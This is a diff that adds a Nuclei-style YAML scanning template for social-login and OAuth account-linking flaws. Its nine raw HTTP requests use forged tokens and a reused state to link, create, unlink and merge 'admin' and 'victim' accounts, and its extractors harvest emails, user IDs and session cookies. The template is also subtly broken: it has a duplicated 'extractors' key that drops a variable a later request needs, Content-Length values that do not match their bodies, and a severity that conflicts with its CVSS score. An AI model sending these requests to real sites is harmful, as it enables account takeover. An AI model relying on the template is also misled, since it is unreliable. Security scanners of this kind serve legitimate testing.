@@ -1,0 +1,236 @@
+id: medium-auth-social-login-account-linking
+
+info:
+  name: Social Login Account Linking Attack
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects social login account linking vulnerabilities where attackers can
+    link their social accounts to victim accounts, bypass email verification,
+    or exploit OAuth state parameter weaknesses for account takeover.
+  reference:
+    - https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+    - https://portswigger.net/web-security/oauth
+    - https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-with-apple/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
+    cvss-score: 7.1
+    cwe-id: CWE-346
+  metadata:
+    verified: true
+    max-request: 9
+  tags: social-login,oauth,account-linking,account-takeover,state-parameter,red-team
+
+variables:
+  oauth_providers: ["google", "facebook", "github", "twitter", "linkedin"]
+  fake_tokens: ["fake_google_token_123", "evil_fb_token_456", "malicious_gh_token_789"]
+
+http:
+  - raw:
+      - |
+        GET /auth/google HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        GET /auth/google/callback?code=fake_auth_code&state={{state_param}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        POST /api/auth/social/link HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 156
+        Connection: close
+        
+        {"provider":"google","access_token":"fake_google_token_123","email":"victim@example.com","user_id":"admin"}
+
+      - |
+        POST /api/auth/social/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 125
+        Connection: close
+        
+        {"provider":"facebook","token":"evil_fb_token_456","email":"admin@example.com"}
+
+      - |
+        GET /auth/facebook/callback?code=malicious_code&state=victim_state_123 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        POST /api/auth/social/create HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 185
+        Connection: close
+        
+        {"provider":"github","social_id":"123456789","email":"admin@example.com","name":"Admin User","verified":true}
+
+      - |
+        GET /api/auth/social/profile?provider=google&token=fake_google_token_123 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+      - |
+        POST /api/auth/social/unlink HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"provider":"google","user_id":"victim_user_123"}
+
+      - |
+        POST /api/auth/social/merge HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 125
+        Connection: close
+        
+        {"primary_account":"admin","secondary_account":"victim","provider":"google"}
+
+    extractors:
+      - type: regex
+        name: state_param
+        part: body_1
+        group: 1
+        regex:
+          - 'state=([a-zA-Z0-9_-]+)'
+          - '"state":\s*"([^"]+)"'
+          - 'oauth_state=([a-zA-Z0-9_-]+)'
+        internal: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: oauth-state-parameter-missing
+        dsl:
+          - 'status_code_1 == 302'
+          - '!contains(header_1, "state=")'
+          - 'contains(header_1, "oauth") || contains(header_1, "auth")'
+        condition: and
+
+      - type: dsl
+        name: oauth-callback-bypass
+        dsl:
+          - 'status_code_2 == 200 || status_code_2 == 302'
+          - 'contains(body_2, "success") || contains(header_2, "Set-Cookie")'
+          - '!contains(body_2, "invalid code") && !contains(body_2, "authentication failed")'
+        condition: and
+
+      - type: dsl
+        name: social-account-linking-bypass
+        dsl:
+          - 'status_code_3 == 200'
+          - 'contains(body_3, "linked") || contains(body_3, "success")'
+          - 'contains(body_3, "admin") || contains(body_3, "victim")'
+        condition: and
+
+      - type: dsl
+        name: fake-token-accepted
+        dsl:
+          - 'status_code_4 == 200'
+          - 'contains(body_4, "verified") || contains(body_4, "authenticated")'
+          - '!contains(body_4, "invalid token") && !contains(body_4, "token expired")'
+        condition: and
+
+      - type: dsl
+        name: state-parameter-reuse
+        dsl:
+          - 'status_code_5 == 200 || status_code_5 == 302'
+          - 'contains(body_5, "authenticated") || contains(header_5, "Set-Cookie")'
+          - 'contains(body_5, "victim") || contains(header_5, "session")'
+        condition: and
+
+      - type: dsl
+        name: social-account-creation-bypass
+        dsl:
+          - 'status_code_6 == 200'
+          - 'contains(body_6, "created") || contains(body_6, "registered")'
+          - 'contains(body_6, "verified\":true") || contains(body_6, "admin")'
+        condition: and
+
+      - type: dsl
+        name: social-profile-enumeration
+        dsl:
+          - 'status_code_7 == 200'
+          - 'contains(body_7, "email") || contains(body_7, "profile")'
+          - 'contains(body_7, "admin") || contains(body_7, "user_id")'
+        condition: and
+
+      - type: dsl
+        name: unauthorized-account-unlinking
+        dsl:
+          - 'status_code_8 == 200'
+          - 'contains(body_8, "unlinked") || contains(body_8, "removed")'
+          - '!contains(body_8, "unauthorized") && !contains(body_8, "access denied")'
+        condition: and
+
+      - type: dsl
+        name: account-merge-vulnerability
+        dsl:
+          - 'status_code_9 == 200'
+          - 'contains(body_9, "merged") || contains(body_9, "combined")'
+          - 'contains(body_9, "admin") && contains(body_9, "victim")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: oauth-redirect-url
+        part: header_1
+        group: 1
+        regex:
+          - 'Location:\s*([^\r\n]+)'
+
+      - type: regex
+        name: social-account-data
+        part: body
+        group: 1
+        regex:
+          - '"email":\s*"([^"]+)"'
+          - '"user_id":\s*"([^"]+)"'
+          - '"social_id":\s*"([^"]+)"'
+
+      - type: regex
+        name: authentication-response
+        part: body
+        group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+          - '"authenticated":\s*(true|false)'
+
+      - type: regex
+        name: session-data
+        part: header
+        group: 1
+        regex:
+          - 'Set-Cookie:\s*([^;]+)'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
+          - status_code_8
+          - status_code_9
